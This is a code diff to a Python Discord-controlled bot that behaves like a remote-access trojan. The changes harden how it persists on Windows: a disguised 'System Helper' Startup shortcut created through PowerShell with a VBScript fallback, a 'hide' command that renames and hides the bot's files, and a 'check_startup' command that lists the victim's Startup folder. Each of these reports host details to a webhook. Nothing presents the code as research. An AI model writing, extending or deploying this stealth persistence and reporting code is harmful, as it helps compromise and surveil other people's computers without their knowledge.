@@ -92,12 +92,23 @@ def add_to_startup(file_path, username=None):
         startup_folder = os.path.join(os.environ['APPDATA'], 
                                        r'Microsoft\Windows\Start Menu\Programs\Startup')
         
+        if not os.path.exists(startup_folder):
+            os.makedirs(startup_folder)
+        
         if username is None:
             username = get_username()
         clean_username = ''.join(c for c in username if c.isalnum() or c in ['_', '-'])
         shortcut_name = f"{clean_username}_helper.lnk"
         shortcut_path = os.path.join(startup_folder, shortcut_name)
         
+        # Delete existing shortcut if exists
+        if os.path.exists(shortcut_path):
+            try:
+                os.remove(shortcut_path)
+            except:
+                pass
+        
+        # Create shortcut using PowerShell
         ps_script = f'''
         $WshShell = New-Object -comObject WScript.Shell
         $Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
@@ -108,8 +119,35 @@ def add_to_startup(file_path, username=None):
         $Shortcut.Save()
         '''
         subprocess.run(['powershell', '-command', ps_script], shell=True, capture_output=True)
-        return shortcut_path
-    except:
+        
+        if os.path.exists(shortcut_path):
+            return shortcut_path
+        
+        # Fallback method using VBScript
+        vbs_script = f'''
+        Set oWS = WScript.CreateObject("WScript.Shell")
+        sLinkFile = "{shortcut_path}"
+        Set oLink = oWS.CreateShortcut(sLinkFile)
+        oLink.TargetPath = "{file_path}"
+        oLink.WorkingDirectory = "{os.path.dirname(file_path)}"
+        oLink.WindowStyle = 7
+        oLink.Description = "System Helper"
+        oLink.Save
+        '''
+        vbs_path = os.path.join(os.environ['TEMP'], 'create_shortcut.vbs')
+        with open(vbs_path, 'w') as f:
+            f.write(vbs_script)
+        subprocess.run(['wscript.exe', vbs_path], shell=True, capture_output=True)
+        try:
+            os.remove(vbs_path)
+        except:
+            pass
+        
+        if os.path.exists(shortcut_path):
+            return shortcut_path
+        return None
+    except Exception as e:
+        print(f"Add to startup error: {e}")
         return None
 
 def remove_from_startup():
@@ -520,11 +558,26 @@ async def hide(ctx):
         if startup_path:
             hidden_paths['startup'] = startup_path
             hide_file(startup_path)
+            startup_success = True
+        else:
+            startup_success = False
         
         is_hidden = True
         
-        await send_webhook(f"**BOT HIDDEN**\nRenamed to: {hide_name}\nUsername: {username}\nStartup added: Yes")
-        await ctx.send(f"Bot hidden successfully! Renamed to: {hide_name}")
+        # Verify startup shortcut exists
+        startup_folder = os.path.join(os.environ['APPDATA'], 
+                                       r'Microsoft\Windows\Start Menu\Programs\Startup')
+        clean_username2 = ''.join(c for c in username if c.isalnum() or c in ['_', '-'])
+        shortcut_name = f"{clean_username2}_helper.lnk"
+        shortcut_path = os.path.join(startup_folder, shortcut_name)
+        shortcut_exists = os.path.exists(shortcut_path)
+        
+        await send_webhook(f"**BOT HIDDEN**\nRenamed to: {hide_name}\nUsername: {username}\nStartup added: {startup_success}\nShortcut exists: {shortcut_exists}\nStartup path: {shortcut_path if startup_success else 'Failed'}")
+        
+        if startup_success and shortcut_exists:
+            await ctx.send(f"Bot hidden successfully! Renamed to: {hide_name} and added to startup")
+        else:
+            await ctx.send(f"Bot renamed to {hide_name} but startup addition may have failed. Check status command.")
         
     except Exception as e:
         await ctx.send(f"Hide failed: {str(e)}")
@@ -565,6 +618,46 @@ async def unhide(ctx):
     except Exception as e:
         await ctx.send(f"Unhide failed: {str(e)}")
         await send_webhook(f"Unhide failed: {str(e)}")
+
+@bot.command()
+async def check_startup(ctx):
+    """Check startup folder contents and permissions"""
+    try:
+        startup_folder = os.path.join(os.environ['APPDATA'], 
+                                       r'Microsoft\Windows\Start Menu\Programs\Startup')
+        
+        msg = f"Startup Folder: {startup_folder}\n"
+        msg += f"Folder exists: {os.path.exists(startup_folder)}\n"
+        
+        if os.path.exists(startup_folder):
+            try:
+                items = os.listdir(startup_folder)
+                msg += f"Items in startup: {len(items)}\n"
+                if items:
+                    msg += "Files:\n"
+                    for item in items[:20]:
+                        msg += f"  - {item}\n"
+            except PermissionError:
+                msg += "Permission denied to read startup folder\n"
+        else:
+            msg += "Startup folder does not exist\n"
+        
+        # Check write permissions
+        try:
+            test_file = os.path.join(startup_folder, "test_write.tmp")
+            with open(test_file, 'w') as f:
+                f.write("test")
+            os.remove(test_file)
+            msg += "Write permission: YES\n"
+        except:
+            msg += "Write permission: NO (run as administrator)\n"
+        
+        await ctx.send(f"```\n{msg}\n```")
+        await send_webhook(f"**STARTUP DIAGNOSTIC**\n```\n{msg}\n```")
+        
+    except Exception as e:
+        await ctx.send(f"Check failed: {str(e)}")
+        await send_webhook(f"Check failed: {str(e)}")
 
 @bot.command()
 async def status(ctx):
